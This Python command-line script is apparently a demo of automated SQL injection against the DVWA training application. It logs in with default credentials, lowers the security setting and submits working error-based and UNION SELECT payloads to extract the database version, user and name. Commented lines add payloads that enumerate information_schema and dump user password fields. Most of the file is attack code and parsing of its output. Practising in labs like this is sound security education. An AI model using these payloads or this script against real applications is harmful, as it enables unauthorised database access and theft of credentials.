#!env python3

import os
import time
import re
import click
from clint.textui import colored, puts
from robobrowser import RoboBrowser

browser = RoboBrowser(history=True, parser="lxml")

def errhandler ():
   click.secho("\n Your input has not been recognised", fg='red')
   menu()


@click.group()
def cli():
    pass


def menu():
    click.secho("\n 1: Check vulnerability \n 2: Get db version \n 3: Get db userlist \n 4: Get dbname \n 5: Exit", fg='white')
    fun = input("Please select what next?  ")
    action.get(fun, errhandler)()


def check():
    """Check to confirm the vulnerability from Form, note would also work from url injection"""
    click.secho(" * Checking vulnerability", fg='red')
    browser.open('http://'+url[2]+'/vulnerabilities/sqli')

    # Passive Test - should throw 'duplicate entry' errors
    inputForm = browser.get_form()
    inputForm['id'].value = "%'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'#"

    click.secho(" * Passive Test:  %s" % inputForm['id'].value , fg='red')
    # submit
    browser.submit_form(inputForm)
    
    # search HTML using regex patterns
    html = browser.find()
    answer = re.search("Duplicate", str(html))
    if answer:
        # then it is vulnerable
        click.secho(" * Passive Test: Application is Vulnerabilable " , fg='white')
    else:
        click.secho(" * Passive Test: Application Safe " , fg='white')
    menu()


def dbname():
    """Display Database Name"""
    #  %' or 0=0 union select null, database() #
    click.secho(" * Checking Database Name", fg='red')
    browser.open('http://'+url[2]+'/vulnerabilities/sqli')

    inputForm = browser.get_form()
    inputForm['id'].value = "%' or 0=0 union select null, database() #"
    # submit
    browser.submit_form(inputForm)
    
    # Parse Data from DVWA
    html = browser.find_all('pre')
    r = re.split('#<br/>', str(html))
    dbName = r[-1].strip('First name: <br/>Surname:').strip('</pre>]')
    click.secho(" * Database Name: %s" %  dbName, fg='white')
    menu()


def dbversion():
    """Obtain the database version"""
    # ‘ union all select system_user(),user() # 
    # %' or 0=0 union select null, version() #
    click.secho(" * Checking Database Version", fg='red')
    browser.open('http://'+url[2]+'/vulnerabilities/sqli')

    inputForm = browser.get_form()
    inputForm['id'].value = "%' or 0=0 union select null, version() #"
    # submit
    browser.submit_form(inputForm)
    
    # Parse Data from DVWA
    html = browser.find_all('pre')
    r = re.split('#<br/>', str(html))
    dbName = r[-1].strip('First name: <br/>Surname:').strip('</pre>]')
    click.secho(" * Database Version: %s" %  dbName, fg='white')
    menu()

def dbuserlist():
    """Display Database Users"""
    # ‘ union all select system_user(),user() #
    #  # %' or 0=0 union select null, user() #
    click.secho(" * DB Users", fg='red')
    browser.open('http://'+url[2]+'/vulnerabilities/sqli')

    inputForm = browser.get_form()
    inputForm['id'].value = "%' or 0=0 union select null, user() #"
    # submit
    browser.submit_form(inputForm)
    
    # Parse Data from DVWA
    html = browser.find_all('pre')
    r = re.split('#<br/>', str(html))

    # Results
    for line in r:
        clean = line.strip("</pre>, <pre>ID: %' or 0=0 union select null, user()")
        clean = clean.strip("[").strip("</pre>]")
        a = re.split('<br/>', clean)
        try:
            d = a[0] +" "+ a[1]
            click.secho(" * %s" % d, fg='white')
        except:
            click.secho(" * %s" % a, fg='white')

    menu()


# def dbtableschema():
#     """Display all tables in information_schema"""
#      # %' and 1=0 union select null, table_name from information_schema.tables #

# # Display all tables in information_schema
#     # %' and 1=0 union select null, table_name from information_schema.tables #

# # Display all the user tables in information_schema
#     # %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#

# # All the columns field contents in the information_schema user table
#     # %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #


# SETUP
@cli.command()
@click.argument('targeturl')
def start(targeturl):
    """Authenticate to the app: admin/password
       Alter the 'security' cookie to 'low' in requests """
    global target
    global url
    target = targeturl

    # Set URL
    url = targeturl.split('/')
    browser.open('http://'+url[2]+'/security.php')
    click.secho(" * Logging into the App", fg='red')

    # Login
    loginForm = browser.get_form()
    loginForm['username'].value = "admin"
    loginForm['password'].value = "password"

    # Submit
    browser.submit_form(loginForm)
    # print(browser.url)
    if str('index.php') in str(browser.url):
        browser.open('http://'+url[2]+'/security.php')

        # Set 'security' cookie to 'low'
        settingForm = browser.get_form()
        # print(settingForm)
        settingForm['security'].value = "low"
        browser.submit_form(settingForm)
        click.secho(" * Security now set to %s" % browser.session.cookies['security'], fg='red' )

        menu()
    

def close():
    pass
    

# CLI start
def main():
    try:
        os.chdir(os.path.dirname(__file__))
        path = os.getcwd() + "/ascii.txt"
    except:
        path = "ascii.txt"
    with open(path, "rt") as in_file:
        smizon = in_file.read()
    click.secho('\n '+smizon, bg='black', fg='white')
    click.secho('\n \t \t CLI for SQL Injection Detection Demo Script \n\n\n',
                bg='blue', fg='white')
    cli()


action = {
    "1": check,
    "2": dbversion,
    "3": dbuserlist,
    "4": dbname,
    "5": close}

# Direct start
if __name__ == "__main__":
    main()
